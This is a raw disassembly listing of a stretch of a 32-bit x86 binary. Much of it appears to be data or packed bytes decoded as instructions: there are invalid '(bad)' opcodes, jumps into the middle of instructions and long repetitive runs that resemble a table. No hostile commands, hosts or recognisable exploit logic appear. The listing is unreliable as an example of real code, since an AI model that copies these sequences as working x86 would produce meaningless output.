  438198:	add    esp,DWORD PTR [ebp+0x3b]
  43819b:	sbb    al,BYTE PTR ds:0x7d4e6ab0
  4381a1:	(bad)  
  4381a2:	and    esp,DWORD PTR [ecx+0xe3d0e3b]
  4381a8:	push   eax
  4381a9:	test   BYTE PTR [eax+esi*8],dh
  4381ac:	pop    esi
  4381ad:	mov    ah,0x8e
  4381af:	jb     0x438182
  4381b1:	aam    0x96
  4381b3:	xchg   esi,eax
  4381b4:	(bad)  
  4381b5:	(bad)  
  4381b6:	mov    esi,0xf3ff3f81
  4381bb:	retf   
  4381bc:	pop    ss
  4381bd:	ds cs push ebx
  4381c0:	push   eax
  4381c1:	cld    
  4381c2:	jg     0x4381c2
  4381c4:	cld    
  4381c5:	or     eax,DWORD PTR [bx+si-0x1804]
  4381ca:	xor    edi,DWORD PTR [edi]
  4381cc:	test   DWORD PTR [edi-0x1e8061fa],0xfcef7f1b
  4381d6:	test   DWORD PTR [ebx+0x3b33ba1f],ecx
  4381dc:	fstp   QWORD PTR [edi-0x26]
  4381df:	fsubr  QWORD PTR [eax-0x58]
  4381e2:	fistp  DWORD PTR [eax-0x45]
  4381e5:	scas   eax,DWORD PTR es:[edi]
  4381e6:	push   ss
  4381e7:	push   ecx
  4381e8:	test   DWORD PTR [edi+0x33369905],edx
  4381ee:	add    BYTE PTR [ecx],bl
  4381f0:	sbb    al,0x58
  4381f2:	in     al,0xa2
  4381f4:	mov    ds:0x36eba6b2,eax
  4381f9:	gs aad 0x1d
  4381fc:	ins    DWORD PTR es:[edi],dx
  4381fd:	add    dh,dh
  4381ff:	push   ss
  438200:	inc    eax
  438201:	inc    ebx
  438202:	sbb    BYTE PTR [edx],0xe0
  438205:	dec    eax
  438206:	xchg   DWORD PTR [esp+eax*4+0x98b1bb0],ecx
  43820d:	push   eax
  43820e:	rcl    BYTE PTR [ebx+0x31],cl
  438211:	push   eax
  438212:	push   edi
  438213:	je     0x438225
  438215:	(bad)  
  438216:	fistp  DWORD PTR [edx]
  438218:	mov    edi,0x26992e29
  43821d:	lock push ecx
  43821f:	cdq    
  438220:	sti    
  438221:	ins    DWORD PTR es:[edi],dx
  438222:	sub    eax,0x4de4e1ee
  438227:	or     esp,ecx
  438229:	mov    ds:0xe3512a7c,al
  43822e:	pusha  
  43822f:	push   eax
  438230:	dec    esi
  438231:	jne    0x438280
  438233:	out    dx,eax
  438234:	test   BYTE PTR [edx],ch
  438236:	dec    esp
  438237:	xor    dl,BYTE PTR [ebx+0x4c]
  43823a:	(bad)  
  43823b:	pushf  
  43823c:	mov    ds:0x931b367a,al
  438241:	add    eax,0x9779ac1d
  438246:	es mul ecx
  438249:	js     0x4382ba
  43824b:	sbb    ch,BYTE PTR [edi]
  43824d:	fcom   DWORD PTR [ecx+esi*8+0x1bc82fb6]
  438254:	cmp    al,0x9
  438256:	xor    al,0x52
  438258:	dec    eax
  438259:	sub    DWORD PTR [ecx+esi*8-0x5a2dd38e],eax
  438260:	push   0xde3959ef
  438265:	jg     0x4382b0
  438267:	dec    esi
  438268:	xchg   ecx,eax
  438269:	fst    QWORD PTR [eax+0x7243de55]
  43826f:	out    0x21,al
  438271:	sbb    edx,DWORD PTR [eax+esi*4]
  438274:	bswap  esi
  438276:	push   ebx
  438277:	jl     0x43828f
  438279:	sub    esp,ebp
  43827b:	cdq    
  43827c:	sbb    al,0x70
  43827e:	bswap  ecx
  438280:	clc    
  438281:	or     BYTE PTR [ebx+edi*4+0x47],cl
  438285:	bound  ebx,QWORD PTR [edi+ebx*8+0x1eeb3390]
  43828c:	xchg   esi,eax
  43828d:	dec    ebp
  43828e:	and    esi,DWORD PTR [edx+0x41a470e0]
  438294:	inc    edx
  438295:	or     DWORD PTR [ecx+0x49c8d686],0x4c
  43829c:	stc    
  43829d:	repz aam 0xae
  4382a0:	arpl   WORD PTR [edx+0x42],si
  4382a3:	push   ss
  4382a4:	in     al,0xa1
  4382a6:	ror    dh,0x31
  4382a9:	iret   
  4382aa:	pop    esi
  4382ab:	(bad)  
  4382ac:	mov    cl,0x22
  4382ae:	les    ecx,FWORD PTR [esi+esi*2]
  4382b1:	test   esp,ebx
  4382b3:	or     DWORD PTR [eax+0x65],ecx
  4382b6:	test   eax,0x7325342e
  4382bb:	push   esi
  4382bc:	loop   0x4382f2
  4382be:	out    0xc4,al
  4382c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4382c1:	ror    BYTE PTR [eax],1
  4382c3:	les    ebx,FWORD PTR [ebx-0x6d8f8b80]
  4382c9:	bound  esp,QWORD PTR [edx+0x51]
  4382cc:	gs push 0x53
  4382cf:	jbe    0x4382ef
  4382d1:	xchg   ebx,eax
  4382d2:	dec    BYTE PTR [esi-0x3832d7b1]
  4382d8:	cwde   
  4382d9:	pop    esp
  4382da:	pop    esp
  4382db:	inc    esp
  4382dc:	jb     0x438346
  4382de:	sbb    edx,esp
  4382e0:	push   cs
  4382e1:	ss xor al,0xf9
  4382e4:	pop    es
  4382e5:	mov    ch,0xd9
  4382e7:	fbld   TBYTE PTR [eax+edx*2]
  4382ea:	dec    ecx
  4382eb:	div    BYTE PTR [ebp-0x415105b]
  4382f1:	cli    
  4382f2:	ss out dx,eax
  4382f4:	mov    dh,0xb5
  4382f6:	int    0xae
  4382f8:	push   ebp
  4382f9:	xlat   BYTE PTR ds:[ebx]
  4382fa:	mov    esi,0xfbbfb6b0
  4382ff:	mov    edi,0xfcfe7f3e
  438304:	jmp    0x438300
  438306:	push   ecx
  438308:	repz inc DWORD PTR [edx]
  43830b:	push   ds
  43830c:	js     0x43832f
  43830e:	gs jb  0x438375
  438311:	dec    ecx
  438312:	add    BYTE PTR cs:[eax],al
  438315:	add    BYTE PTR [eax],al
  438317:	dec    ecx
  438318:	inc    ebp
  438319:	dec    esi
  43831a:	inc    esp
  43831b:	scas   al,BYTE PTR es:[edi]
  43831c:	inc    edx
  43831d:	pusha  
  43831e:	sub    BYTE PTR [eax],0x0
  438321:	add    BYTE PTR [eax],al
  438323:	add    BYTE PTR [eax],0x0
  438326:	add    BYTE PTR [eax],al
  438328:	add    DWORD PTR [eax],eax
  43832a:	add    BYTE PTR [ecx],al
  43832c:	add    BYTE PTR [eax],ah
  43832e:	add    BYTE PTR [eax],al
  438330:	add    BYTE PTR [eax],al
  438332:	add    BYTE PTR [eax],al
  438334:	or     BYTE PTR [ecx],al
	...
  438346:	add    BYTE PTR [edi+edi*2-0x5c49e577],bl
  43834d:	mov    ds:0xa3a3b60e,eax
  438352:	push   cs
  438353:	mov    ds:0xc80e9191,eax
  438358:	mov    dh,0xb6
  43835a:	push   cs
  43835b:	enter  0xb6b6,0xe
  43835f:	enter  0xb6b6,0xe
  438363:	dec    ecx
  438364:	inc    ebx
  438365:	push   esp
  438366:	pop    edx
  438367:	sub    DWORD PTR [edi],esp
  438369:	inc    ecx
  43836a:	les    ebx,FWORD PTR [eax]
  43836c:	adc    eax,0xb0cf238
  438371:	sub    al,0xf8
  438373:	add    BYTE PTR [eax],al
  438375:	sub    eax,0x1d0000ff
  43837a:	inc    DWORD PTR [eax]
  43837c:	add    BYTE PTR [edx],bh
  43837e:	inc    DWORD PTR [eax]
  438380:	add    BYTE PTR [edi+edi*8],bh
  438383:	add    BYTE PTR [eax],al
  438385:	and    edi,edi
  438387:	add    BYTE PTR [eax],al
  438389:	xor    edi,edi
  43838b:	add    BYTE PTR [eax],al
  43838d:	sub    bh,bh
  43838f:	add    BYTE PTR [eax],al
  438391:	and    eax,0x370000ff
  438396:	inc    DWORD PTR [eax]
  438398:	add    BYTE PTR [edx],ch
  43839a:	inc    DWORD PTR [eax]
  43839c:	add    BYTE PTR [ebx],ah
  43839e:	inc    DWORD PTR [eax]
  4383a0:	add    BYTE PTR ds:0x310000ff,ch
  4383a6:	inc    DWORD PTR [eax]
  4383a8:	add    BYTE PTR [esi],ch
  4383aa:	inc    DWORD PTR [eax]
  4383ac:	add    BYTE PTR [edi],ch
  4383ae:	inc    DWORD PTR [eax]
  4383b0:	add    BYTE PTR [eax],dh
  4383b2:	inc    DWORD PTR [eax]
  4383b4:	add    BYTE PTR [esi],ch
  4383b6:	inc    DWORD PTR [eax]
  4383b8:	add    BYTE PTR [ebp-0x1],al
  4383bb:	add    BYTE PTR [eax],al
  4383bd:	cmp    al,0xff
  4383bf:	add    BYTE PTR [eax],al
  4383c1:	das    
  4383c2:	inc    DWORD PTR [eax]
  4383c4:	add    BYTE PTR [edi],dh
  4383c6:	inc    DWORD PTR [eax]
  4383c8:	add    BYTE PTR [esi],ch
  4383ca:	inc    DWORD PTR [eax]
  4383cc:	add    BYTE PTR [edx],ch
  4383ce:	inc    DWORD PTR [eax]
  4383d0:	add    BYTE PTR [ebp-0x1],al
  4383d3:	add    BYTE PTR [eax],al
  4383d5:	xor    eax,0x390000ff
  4383da:	inc    DWORD PTR [eax]
  4383dc:	add    BYTE PTR [edx],bh
  4383de:	inc    DWORD PTR [eax]
  4383e0:	add    BYTE PTR [edx],dh
  4383e2:	inc    DWORD PTR [eax]
  4383e4:	add    BYTE PTR [ebx],dh
  4383e6:	inc    DWORD PTR [eax]
  4383e8:	add    BYTE PTR [edx],bh
  4383ea:	inc    DWORD PTR [eax]
  4383ec:	add    BYTE PTR [eax],bh
  4383ee:	inc    DWORD PTR [eax]
  4383f0:	add    BYTE PTR [edx],bh
  4383f2:	inc    DWORD PTR [eax]
  4383f4:	add    BYTE PTR [ecx],ch
  4383f6:	inc    DWORD PTR [eax]
  4383f8:	add    BYTE PTR [edi+edi*8],dh
  4383fb:	add    BYTE PTR [eax],al
  4383fd:	das    
  4383fe:	inc    DWORD PTR [eax]
  438400:	add    BYTE PTR [ecx],dh
  438402:	inc    DWORD PTR [eax]
  438404:	add    BYTE PTR [ebx],bh
  438406:	inc    DWORD PTR [eax]
  438408:	add    BYTE PTR [eax],dh
  43840a:	inc    DWORD PTR [eax]
  43840c:	add    BYTE PTR [esi],dh
  43840e:	inc    DWORD PTR [eax]
  438410:	add    BYTE PTR [edx-0x1],al
  438413:	add    BYTE PTR [eax],al
  438415:	aaa    
  438416:	inc    DWORD PTR [eax]
  438418:	add    BYTE PTR [ebx-0x1],al
  43841b:	add    BYTE PTR [eax],al
  43841d:	dec    eax
  43841e:	inc    DWORD PTR [eax]
  438420:	add    BYTE PTR [ecx],dh
  438422:	inc    DWORD PTR [eax]
  438424:	add    BYTE PTR [ecx-0x1],cl
  438427:	add    BYTE PTR [eax],al
  438429:	dec    eax
  43842a:	inc    DWORD PTR [eax]
  43842c:	add    BYTE PTR [eax-0x1],al
  43842f:	add    BYTE PTR [eax],al
  438431:	cmp    edi,edi
  438433:	add    BYTE PTR [eax],al
  438435:	cmp    al,0xff
  438437:	add    BYTE PTR [eax],al
  438439:	pusha  
  43843a:	inc    DWORD PTR [eax]
  43843c:	add    BYTE PTR [edx-0x1],cl
  43843f:	add    BYTE PTR [eax],al
  438441:	inc    DWORD PTR ds:[eax]
  438444:	add    BYTE PTR [edi],dh
  438446:	inc    DWORD PTR [eax]
  438448:	add    BYTE PTR [ebp-0x1],al
  43844b:	add    BYTE PTR [eax],al
  43844d:	cmp    eax,0x490000ff
  438452:	inc    DWORD PTR [eax]
  438454:	add    BYTE PTR [ecx],bh
  438456:	inc    DWORD PTR [eax]
  438458:	add    BYTE PTR [esi-0x1],cl
  43845b:	add    BYTE PTR [eax],al
  43845d:	jo     0x43845e
  43845f:	add    BYTE PTR [eax],al
  438461:	inc    ebp
  438462:	inc    DWORD PTR [eax]
  438464:	add    BYTE PTR [edi-0x1],al
  438467:	add    BYTE PTR [eax],al
  438469:	dec    ecx
  43846a:	inc    DWORD PTR [eax]
  43846c:	add    BYTE PTR [ecx-0x1],dl
  43846f:	add    BYTE PTR [eax],al
  438471:	cmp    bh,bh
  438473:	add    BYTE PTR [eax],al
  438475:	inc    DWORD PTR ds:[eax]
  438478:	add    BYTE PTR [ebp-0x1],cl
  43847b:	add    BYTE PTR [eax],al
  43847d:	aas    
  43847e:	inc    DWORD PTR [eax]
  438480:	add    BYTE PTR [ebx],bh
  438482:	inc    DWORD PTR [eax]
  438484:	add    BYTE PTR [ecx],bh
  438486:	inc    DWORD PTR [eax]
  438488:	add    BYTE PTR [esi-0x1],al
  43848b:	add    BYTE PTR [eax],al
  43848d:	inc    ecx
  43848e:	inc    DWORD PTR [eax]
  438490:	add    BYTE PTR [eax-0x1],cl
  438493:	add    BYTE PTR [eax],al
  438495:	xor    bh,bh
  438497:	add    BYTE PTR [eax],al
  438499:	cmp    al,0xff
  43849b:	add    BYTE PTR [eax],al
  43849d:	inc    edx
  43849e:	inc    DWORD PTR [eax]
  4384a0:	add    BYTE PTR ds:0x3e0000ff,bh
  4384a6:	inc    DWORD PTR [eax]
  4384a8:	add    BYTE PTR ds:0x2f0000ff,bh
  4384ae:	inc    DWORD PTR [eax]
  4384b0:	add    BYTE PTR [esi],bh
  4384b2:	inc    DWORD PTR [eax]
  4384b4:	add    BYTE PTR [esi],dh
  4384b6:	inc    DWORD PTR [eax]
  4384b8:	add    BYTE PTR [edi+edi*8],ah
  4384bb:	add    BYTE PTR [eax],al
  4384bd:	inc    edi
  4384be:	inc    DWORD PTR [eax]
  4384c0:	add    BYTE PTR [eax],bh
  4384c2:	inc    DWORD PTR [eax]
  4384c4:	add    BYTE PTR [ecx],ch
  4384c6:	inc    DWORD PTR [eax]
  4384c8:	add    BYTE PTR [edi+edi*8],dh
  4384cb:	add    BYTE PTR [eax],al
  4384cd:	inc    edi
  4384ce:	inc    DWORD PTR [eax]
  4384d0:	add    BYTE PTR [esi],dh
  4384d2:	inc    DWORD PTR [eax]
  4384d4:	add    BYTE PTR [ecx],dh
  4384d6:	inc    DWORD PTR [eax]
  4384d8:	add    BYTE PTR [esi],dh
  4384da:	inc    DWORD PTR [eax]
  4384dc:	add    BYTE PTR [esi],bh
  4384de:	inc    DWORD PTR [eax]
  4384e0:	add    BYTE PTR ds:0x3d0000ff,dh
  4384e6:	inc    DWORD PTR [eax]
  4384e8:	add    BYTE PTR ds:0x2d0000ff,bh
  4384ee:	inc    DWORD PTR [eax]
  4384f0:	add    BYTE PTR ds:0x370000ff,ch
  4384f6:	inc    DWORD PTR [eax]
  4384f8:	add    BYTE PTR [edi],dh
  4384fa:	inc    DWORD PTR [eax]
  4384fc:	add    BYTE PTR [ecx],bh
  4384fe:	inc    DWORD PTR [eax]
  438500:	add    BYTE PTR [esi],bh
  438502:	inc    DWORD PTR [eax]
  438504:	add    BYTE PTR [ebp-0x1],cl
  438507:	add    BYTE PTR [eax],al
  438509:	inc    esi
  43850a:	inc    DWORD PTR [eax]
  43850c:	add    BYTE PTR [eax-0x1],al
  43850f:	add    BYTE PTR [eax],al
  438511:	inc    ecx
  438512:	inc    DWORD PTR [eax]
  438514:	add    BYTE PTR [ecx-0x1],al
  438517:	add    BYTE PTR [eax],al
  438519:	inc    esp
  43851a:	call   DWORD PTR [esi]
  43851c:	push   ss
  43851d:	inc    edi
  43851e:	cmc    
  43851f:	and    DWORD PTR [eax],esp
  438521:	dec    ecx
  438522:	in     al,dx
  438523:	cmp    BYTE PTR ds:0x4650ab4d,dh
  438529:	push   esp
  43852a:	ss fcmove st,st(0)
  43852d:	enter  0xda0e,0xc8
  438531:	enter  0xc80e,0xb6
  438535:	enter  0xc80e,0xb6
  438539:	mov    dh,0xe
  43853b:	mov    dh,0xa3
  43853d:	mov    dh,0xe
  43853f:	enter  0xb6a3,0xe
  438543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438544:	xchg   ebx,eax
  438545:	pushf  
  438546:	sbb    cl,BYTE PTR [ebx+0xb7373]
	...
  438558:	add    BYTE PTR [eax],al
  43855a:	add    BYTE PTR [esi],dh
  43855c:	xor    al,BYTE PTR [eax+0x6b]
  43855f:	adc    edx,DWORD PTR [eax]
  438561:	sub    eax,0x270000f3
  438566:	inc    DWORD PTR [eax]
  438568:	add    BYTE PTR [ebx],bh
  43856a:	inc    DWORD PTR [eax]
  43856c:	add    BYTE PTR [esi],dh
  43856e:	inc    DWORD PTR [eax]
  438570:	add    BYTE PTR [ecx-0x1],al
  438573:	add    BYTE PTR [eax],al
  438575:	inc    eax
  438576:	inc    DWORD PTR [eax]
  438578:	add    BYTE PTR ds:0x2a0000ff,bh
  43857e:	inc    DWORD PTR [eax]
  438580:	add    BYTE PTR ds:0x330000ff,bh
  438586:	inc    DWORD PTR [eax]
  438588:	add    BYTE PTR [edi+edi*8],ch
  43858b:	add    BYTE PTR [eax],al
  43858d:	xor    al,0xff
  43858f:	add    BYTE PTR [eax],al
  438591:	inc    DWORD PTR cs:[eax]
  438594:	add    BYTE PTR [ebx],dh
  438596:	inc    DWORD PTR [eax]
  438598:	add    BYTE PTR ds:0x2b0000ff,bh
  43859e:	inc    DWORD PTR [eax]
  4385a0:	add    BYTE PTR [esi],dh
  4385a2:	inc    DWORD PTR [eax]
  4385a4:	add    BYTE PTR [eax],dh
  4385a6:	inc    DWORD PTR [eax]
  4385a8:	add    BYTE PTR [ecx],ch
  4385aa:	inc    DWORD PTR [eax]
  4385ac:	add    BYTE PTR [edi+edi*8+0x0],al
  4385b0:	add    BYTE PTR [edx],ah
  4385b2:	inc    DWORD PTR [eax]
  4385b4:	add    BYTE PTR [ebx],bh
  4385b6:	inc    DWORD PTR [eax]
  4385b8:	add    BYTE PTR [eax-0x1],al
  4385bb:	add    BYTE PTR [eax],al
  4385bd:	aas    
  4385be:	inc    DWORD PTR [eax]
  4385c0:	add    BYTE PTR [edx-0x1],cl
  4385c3:	add    BYTE PTR [eax],al
  4385c5:	and    edi,edi
  4385c7:	add    BYTE PTR [eax],al
  4385c9:	sbb    edi,edi
  4385cb:	add    BYTE PTR [eax],al
  4385cd:	sub    al,0xff
  4385cf:	add    BYTE PTR [eax],al
  4385d1:	inc    esi
  4385d2:	inc    DWORD PTR [eax]
  4385d4:	add    BYTE PTR [ebx-0x1],dl
  4385d7:	add    BYTE PTR [eax],al
  4385d9:	aaa    
  4385da:	inc    DWORD PTR [eax]
  4385dc:	add    BYTE PTR [eax],ch
  4385de:	inc    DWORD PTR [eax]
  4385e0:	add    BYTE PTR [edx-0x1],al
  4385e3:	add    BYTE PTR [eax],al
  4385e5:	inc    eax
  4385e6:	inc    DWORD PTR [eax]
  4385e8:	add    BYTE PTR [ecx-0x1],al
  4385eb:	add    BYTE PTR [eax],al
  4385ed:	cmp    edi,edi
  4385ef:	add    BYTE PTR [eax],al
  4385f1:	dec    ecx
  4385f2:	inc    DWORD PTR [eax]
  4385f4:	add    BYTE PTR [edx-0x1],al
  4385f7:	add    BYTE PTR [eax],al
  4385f9:	dec    ebx
  4385fa:	inc    DWORD PTR [eax]
  4385fc:	add    BYTE PTR [edi+edi*8+0x0],al
  438600:	add    BYTE PTR [edi],bh
  438602:	inc    DWORD PTR [eax]
  438604:	add    BYTE PTR [ebx-0x1],al
  438607:	add    BYTE PTR [eax],al
  438609:	dec    eax
  43860a:	inc    DWORD PTR [eax]
  43860c:	add    BYTE PTR [eax-0x1],bl
  43860f:	add    BYTE PTR [eax],al
  438611:	xor    edi,edi
  438613:	add    BYTE PTR [eax],al
  438615:	cmp    al,0xff
  438617:	add    BYTE PTR [eax],al
  438619:	inc    ebp
  43861a:	inc    DWORD PTR [eax]
  43861c:	add    BYTE PTR [eax-0x1],cl
  43861f:	add    BYTE PTR [eax],al
  438621:	cmp    edi,edi
  438623:	add    BYTE PTR [eax],al
  438625:	push   eax
  438626:	inc    DWORD PTR [eax]
  438628:	add    BYTE PTR [ebp-0x1],cl
  43862b:	add    BYTE PTR [eax],al
  43862d:	cmp    edi,edi
  43862f:	add    BYTE PTR [eax],al
  438631:	ins    BYTE PTR es:[edi],dx
  438632:	inc    DWORD PTR [eax]
  438634:	add    BYTE PTR [edx-0x1],cl
  438637:	add    BYTE PTR [eax],al
  438639:	cmp    eax,0x430000ff
  43863e:	inc    DWORD PTR [eax]
  438640:	add    BYTE PTR [ebp-0x1],dl
  438643:	add    BYTE PTR [eax],al
  438645:	push   ecx
  438646:	inc    DWORD PTR [eax]
  438648:	add    BYTE PTR [eax-0x1],cl
  43864b:	add    BYTE PTR [eax],al
  43864d:	dec    ebx
  43864e:	inc    DWORD PTR [eax]
  438650:	add    BYTE PTR [eax-0x1],ah
  438653:	add    BYTE PTR [eax],al
  438655:	dec    edx
  438656:	inc    DWORD PTR [eax]
  438658:	add    BYTE PTR [esi],bh
  43865a:	inc    DWORD PTR [eax]
  43865c:	add    BYTE PTR ds:0x3a0000ff,ch
  438662:	inc    DWORD PTR [eax]
  438664:	add    BYTE PTR [edi+edi*8+0x0],bl
  438668:	add    BYTE PTR [edx-0x1],ch
  43866b:	add    BYTE PTR [eax],al
  43866d:	popa   
  43866e:	inc    DWORD PTR [eax]
  438670:	add    BYTE PTR [ebx],dh
  438672:	inc    DWORD PTR [eax]
  438674:	add    BYTE PTR [ebx],dh
  438676:	inc    DWORD PTR [eax]
  438678:	add    BYTE PTR [edi-0x1],al
  43867b:	add    BYTE PTR [eax],al
  43867d:	aaa    
  43867e:	inc    DWORD PTR [eax]
  438680:	add    BYTE PTR ds:0x440000ff,dh
  438686:	inc    DWORD PTR [eax]
  438688:	add    BYTE PTR [eax-0x1],bl
  43868b:	add    BYTE PTR [eax],al
  43868d:	xor    bh,bh
  43868f:	add    BYTE PTR [eax],al
  438691:	dec    esi
  438692:	inc    DWORD PTR [eax]
  438694:	add    BYTE PTR [edi+edi*8+0x0],al
  438698:	add    BYTE PTR [edi],bh
  43869a:	inc    DWORD PTR [eax]
  43869c:	add    BYTE PTR [eax-0x1],cl
  43869f:	add    BYTE PTR [eax],al
  4386a1:	inc    esi
  4386a2:	inc    DWORD PTR [eax]
  4386a4:	add    BYTE PTR [ecx-0x1],al
  4386a7:	add    BYTE PTR [eax],al
  4386a9:	push   esi
  4386aa:	inc    DWORD PTR [eax]
  4386ac:	add    BYTE PTR [edi-0x1],dl
  4386af:	add    BYTE PTR [eax],al
  4386b1:	sub    edi,edi
  4386b3:	add    BYTE PTR [eax],al
  4386b5:	cmp    bh,bh
  4386b7:	add    BYTE PTR [eax],al
  4386b9:	xor    edi,edi
  4386bb:	add    BYTE PTR [eax],al
  4386bd:	popa   
  4386be:	inc    DWORD PTR [eax]
  4386c0:	add    BYTE PTR [edi],dh
  4386c2:	inc    DWORD PTR [eax]
  4386c4:	add    BYTE PTR [esi-0x1],al
  4386c7:	add    BYTE PTR [eax],al
  4386c9:	aas    
  4386ca:	inc    DWORD PTR [eax]
  4386cc:	add    BYTE PTR [edi+edi*8],bh
  4386cf:	add    BYTE PTR [eax],al
  4386d1:	inc    DWORD PTR cs:[eax]
  4386d4:	add    BYTE PTR [edi],ch
  4386d6:	inc    DWORD PTR [eax]
  4386d8:	add    BYTE PTR ds:0x320000ff,ch
  4386de:	inc    DWORD PTR [eax]
  4386e0:	add    BYTE PTR [edi],dh
  4386e2:	inc    DWORD PTR [eax]
  4386e4:	add    BYTE PTR [edi+edi*8],dh
  4386e7:	add    BYTE PTR [eax],al
  4386e9:	cmp    bh,bh
  4386eb:	add    BYTE PTR [eax],al
  4386ed:	cmp    bh,bh
  4386ef:	add    BYTE PTR [eax],al
  4386f1:	xor    al,0xff
  4386f3:	add    BYTE PTR [eax],al
  4386f5:	push   esp
  4386f6:	inc    DWORD PTR [eax]
  4386f8:	add    BYTE PTR [edi-0x1],cl
  4386fb:	add    BYTE PTR [eax],al
  4386fd:	inc    DWORD PTR ds:[eax]
  438700:	add    BYTE PTR [eax],bh
  438702:	inc    DWORD PTR [eax]
  438704:	add    BYTE PTR [edi],dh
  438706:	inc    DWORD PTR [eax]
  438708:	add    BYTE PTR [ebx-0x1],al
  43870b:	add    BYTE PTR [eax],al
  43870d:	cmp    al,0xff
  43870f:	add    BYTE PTR [eax],al
  438711:	xor    bh,bh
  438713:	add    BYTE PTR [eax],al
  438715:	inc    DWORD PTR ss:[eax]
  438718:	add    BYTE PTR [esi],dh
  43871a:	inc    DWORD PTR [eax]
  43871c:	add    BYTE PTR [ecx],dh
  43871e:	inc    DWORD PTR [eax]
  438720:	add    BYTE PTR [ecx],bh
  438722:	inc    DWORD PTR [eax]
  438724:	add    BYTE PTR [ebx],dh
  438726:	inc    DWORD PTR [ecx]
  438728:	add    DWORD PTR [edi],esi
  43872a:	jmp    DWORD PTR [edi+ebx*1]
  43872d:	aas    
  43872e:	loope  0x438769
  438730:	xor    al,0x43
  438732:	xor    eax,0x0
	...
  438743:	mov    ecx,0x910bb9a2
  438748:	ins    DWORD PTR es:[edi],dx
  438749:	jg     0x438759
	...
  438757:	daa    
  438758:	es cmp eax,0x210000cf
  43875e:	inc    DWORD PTR [eax]
  438760:	add    BYTE PTR [edi+edi*8],ah
  438763:	add    BYTE PTR [eax],al
  438765:	and    bh,bh
  438767:	add    BYTE PTR [eax],al
  438769:	sbb    al,0xff
  43876b:	add    BYTE PTR [eax],al
  43876d:	sub    al,0xff
  43876f:	add    BYTE PTR [eax],al
  438771:	and    bh,bh
  438773:	add    BYTE PTR [eax],al
  438775:	push   ss
  438776:	inc    DWORD PTR [eax]
  438778:	add    BYTE PTR [esi],ah
  43877a:	inc    DWORD PTR [eax]
  43877c:	add    BYTE PTR [eax],bh
  43877e:	inc    DWORD PTR [eax]
  438780:	add    BYTE PTR ds:0x320000ff,ch
  438786:	inc    DWORD PTR [eax]
  438788:	add    BYTE PTR [edx-0x1],cl
  43878b:	add    BYTE PTR [eax],al
  43878d:	inc    DWORD PTR ss:[eax]
  438790:	add    BYTE PTR [edi],ch
  438792:	inc    DWORD PTR [eax]
  438794:	add    BYTE PTR [ecx-0x1],al
  438797:	add    BYTE PTR [eax],al
  438799:	cmp    bh,bh
  43879b:	add    BYTE PTR [eax],al
  43879d:	xor    eax,0x2f0000ff
  4387a2:	inc    DWORD PTR [eax]
  4387a4:	add    BYTE PTR [ebx],ah
  4387a6:	inc    DWORD PTR [eax]
  4387a8:	add    BYTE PTR [esi],bh
  4387aa:	inc    DWORD PTR [eax]
  4387ac:	add    BYTE PTR [ebx-0x1],cl
  4387af:	add    BYTE PTR [eax],al
  4387b1:	inc    DWORD PTR ss:[eax]
  4387b4:	add    BYTE PTR [edi],dh
  4387b6:	inc    DWORD PTR [eax]
  4387b8:	add    BYTE PTR [edx],bh
  4387ba:	inc    DWORD PTR [eax]
  4387bc:	add    BYTE PTR [esi-0x1],cl
  4387bf:	add    BYTE PTR [eax],al
  4387c1:	xor    edi,edi
  4387c3:	add    BYTE PTR [eax],al
  4387c5:	dec    edx
  4387c6:	inc    DWORD PTR [eax]
  4387c8:	add    BYTE PTR [edi],ch
  4387ca:	inc    DWORD PTR [eax]
  4387cc:	add    BYTE PTR [eax],bh
  4387ce:	inc    DWORD PTR [eax]
  4387d0:	add    BYTE PTR [edi],ch
  4387d2:	inc    DWORD PTR [eax]
  4387d4:	add    BYTE PTR [edx-0x1],al
  4387d7:	add    BYTE PTR [eax],al
  4387d9:	push   esi
  4387da:	inc    DWORD PTR [eax]
  4387dc:	add    BYTE PTR [ebp-0x1],cl
  4387df:	add    BYTE PTR [eax],al
  4387e1:	cmp    bh,bh
  4387e3:	add    BYTE PTR [eax],al
  4387e5:	cmp    bh,bh
  4387e7:	add    BYTE PTR [eax],al
  4387e9:	xor    eax,0x350000ff
  4387ee:	inc    DWORD PTR [eax]
  4387f0:	add    BYTE PTR [ebx-0x1],al
  4387f3:	add    BYTE PTR [eax],al
  4387f5:	inc    esp
  4387f6:	inc    DWORD PTR [eax]
  4387f8:	add    BYTE PTR [eax-0x1],bl
  4387fb:	add    BYTE PTR [eax],al
  4387fd:	inc    esp
  4387fe:	inc    DWORD PTR [eax]
  438800:	add    BYTE PTR [ecx],dh
  438802:	inc    DWORD PTR [eax]
  438804:	add    BYTE PTR [ebx-0x1],dl
  438807:	add    BYTE PTR [eax],al
  438809:	aaa    
  43880a:	inc    DWORD PTR [eax]
  43880c:	add    BYTE PTR [ebp-0x1],al
  43880f:	add    BYTE PTR [eax],al
  438811:	dec    edx
  438812:	inc    DWORD PTR [eax]
  438814:	add    BYTE PTR [esi],ch
  438816:	inc    DWORD PTR [eax]
  438818:	add    BYTE PTR [esi-0x1],al
  43881b:	add    BYTE PTR [eax],al
  43881d:	push   ecx
  43881e:	inc    DWORD PTR [eax]
  438820:	add    BYTE PTR [esi],bh
  438822:	inc    DWORD PTR [eax]
  438824:	add    BYTE PTR [edx],dh
  438826:	inc    DWORD PTR [eax]
  438828:	add    BYTE PTR [edi],bh
  43882a:	inc    DWORD PTR [eax]
  43882c:	add    BYTE PTR ds:0x530000ff,bh
  438832:	inc    DWORD PTR [eax]
  438834:	add    BYTE PTR [ebx],bh
  438836:	inc    DWORD PTR [eax]
  438838:	add    BYTE PTR [edi+edi*8+0x0],dl
  43883c:	add    BYTE PTR [esi],dh
  43883e:	inc    DWORD PTR [eax]
  438840:	add    BYTE PTR [edx],ch
  438842:	inc    DWORD PTR [eax]
  438844:	add    BYTE PTR ds:0x430000ff,dh
  43884a:	inc    DWORD PTR [eax]
  43884c:	add    BYTE PTR [edi],bh
  43884e:	inc    DWORD PTR [eax]
  438850:	add    BYTE PTR [esi-0x1],al
  438853:	add    BYTE PTR [eax],al
  438855:	dec    ebx
  438856:	inc    DWORD PTR [eax]
  438858:	add    BYTE PTR [edi-0x1],cl
  43885b:	add    BYTE PTR [eax],al
  43885d:	cmp    al,0xff
  43885f:	add    BYTE PTR [eax],al
  438861:	cmp    bh,bh
  438863:	add    BYTE PTR [eax],al
  438865:	push   eax
  438866:	inc    DWORD PTR [eax]
  438868:	add    BYTE PTR [edx-0x1],bl
  43886b:	add    BYTE PTR [eax],al
